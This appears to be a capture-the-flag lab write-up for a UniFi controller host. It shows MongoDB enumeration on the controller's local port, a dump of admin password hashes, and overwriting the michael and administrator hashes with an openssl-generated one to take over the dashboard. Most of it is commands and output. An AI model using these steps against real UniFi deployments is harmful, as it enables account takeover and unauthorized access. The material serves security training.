After linpeas enumeration, the attacker sees there is a mongod service running.
```
<SNIP>
/usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1         
<SNIP>
```

## Connecting and enumerating
```
unifi@unified:/tmp/ignore$ which mongo
which mongo
/usr/bin/mongo
unifi@unified:/tmp/ignore$ mongo --port 27117
mongo --port 27117
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/
MongoDB server version: 3.6.3
show dbs
ace       0.002GB                                                                                                                                            
ace_stat  0.000GB                                                                                                                                            
admin     0.000GB                                                                                                                                            
config    0.000GB                                                                                                                                            
local     0.000GB 
```

## ace
```
use ace
switched to db ace
show collections
account
admin
alarm
alert
<SNIP>
wlangroup

```
### ace - admin
```
db.admin.find().pretty()
{
        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
        "name" : "administrator",
        "email" : "administrator@unified.htb",
        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
        "time_created" : NumberLong(1640900495),
        "last_site_name" : "default",
        "ui_settings" : {
                "neverCheckForUpdate" : true,
                "statisticsPrefferedTZ" : "SITE",
                "statisticsPreferBps" : "",

<SNIP>

{
        "_id" : ObjectId("61ce4a63fbce5e00116f424f"),
        "email" : "michael@unified.htb",
        "name" : "michael",
        "x_shadow" : "$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0",
        "requires_new_password" : false,
        "time_created" : NumberLong(1640909411),
        "last_site_name" : "default",
        "email_alert_enabled" : false,
        "email_alert_grouping_enabled" : false,
        "email_alert_grouping_delay" : 60,
        "push_alert_enabled" : false
}
{
        "_id" : ObjectId("61ce4ce8fbce5e00116f4251"),
        "email" : "seamus@unified.htb",
        "name" : "Seamus",
        "x_shadow" : "$6$NT.hcX..$aFei35dMy7Ddn.O.UFybjrAaRR5UfzzChhIeCs0lp1mmXhVHol6feKv4hj8LaGe0dTiyvq1tmA.j9.kfDP.xC.",
        "requires_new_password" : true,
        "time_created" : NumberLong(1640910056),
        "last_site_name" : "default"
}
{
        "_id" : ObjectId("61ce4d27fbce5e00116f4252"),
        "email" : "warren@unified.htb",
        "name" : "warren",
        "x_shadow" : "$6$DDOzp/8g$VXE2i.FgQSRJvTu.8G4jtxhJ8gm22FuCoQbAhhyLFCMcwX95ybr4dCJR/Otas100PZA9fHWgTpWYzth5KcaCZ.",
        "requires_new_password" : true,
        "time_created" : NumberLong(1640910119),
        "last_site_name" : "default"
}
{
        "_id" : ObjectId("61ce4d51fbce5e00116f4253"),
        "email" : "james@unfiied.htb",
        "name" : "james",
        "x_shadow" : "$6$ON/tM.23$cp3j11TkOCDVdy/DzOtpEbRC5mqbi1PPUM6N4ao3Bog8rO.ZGqn6Xysm3v0bKtyclltYmYvbXLhNybGyjvAey1",
        "requires_new_password" : false,
        "time_created" : NumberLong(1640910161),
        "last_site_name" : "default"
}

```

There are multiple users found. Michael has a home directory on the target, so maybe his password can be changed and used to log in. This will likely apply to the portal, but maybe ssh.

## Updating hashes
```
### Get the hash to use
┌──(kali㉿kali)-[~]
└─$ openssl passwd -6 pwned   
$6$inLX6PhYbRL5as4x$odsMivsoE6QIPEqYJElcoBYV2X4XphJpLTo4RyL8cK3k4JJcwdUUcQHkgbUs2DJqMHDAwx8hPpq7LK0cAwyUC.

### Setting the new hashed variable
db.admin.update( {email: "michael@unified.htb"}, { $set: {x_shadow: "$6$inLX6PhYbRL5as4x$odsMivsoE6QIPEqYJElcoBYV2X4XphJpLTo4RyL8cK3k4JJcwdUUcQHkgbUs2DJqMHDAwx8hPpq7LK0cAwyUC." } } )
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })

### Confirming the value is set
db.admin.find({name: "michael"}).pretty()
{
        "_id" : ObjectId("61ce4a63fbce5e00116f424f"),
        "email" : "michael@unified.htb",
        "name" : "michael",
        "x_shadow" : "$6$inLX6PhYbRL5as4x$odsMivsoE6QIPEqYJElcoBYV2X4XphJpLTo4RyL8cK3k4JJcwdUUcQHkgbUs2DJqMHDAwx8hPpq7LK0cAwyUC.",
        "requires_new_password" : false,
        "time_created" : NumberLong(1640909411),
        "last_site_name" : "default",
        "email_alert_enabled" : false,
        "email_alert_grouping_enabled" : false,
        "email_alert_grouping_delay" : 60,
        "push_alert_enabled" : false
}

```

Michael can log into the dashboard with the new password!
![[michaelWebAccess.png]]

## Setting new administrator credentials
```
db.admin.update({email: "administrator@unified.htb"}, { $set: {x_shadow: "$6$inLX6PhYbRL5as4x$odsMivsoE6QIPEqYJElcoBYV2X4XphJpLTo4RyL8cK3k4JJcwdUUcQHkgbUs2DJqMHDAwx8hPpq7LK0cAwyUC." } } )
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
```
![[administratorLogin.png]]

Michael appears to be a Super Administrator
![[michaelSuperAdmin.png]]
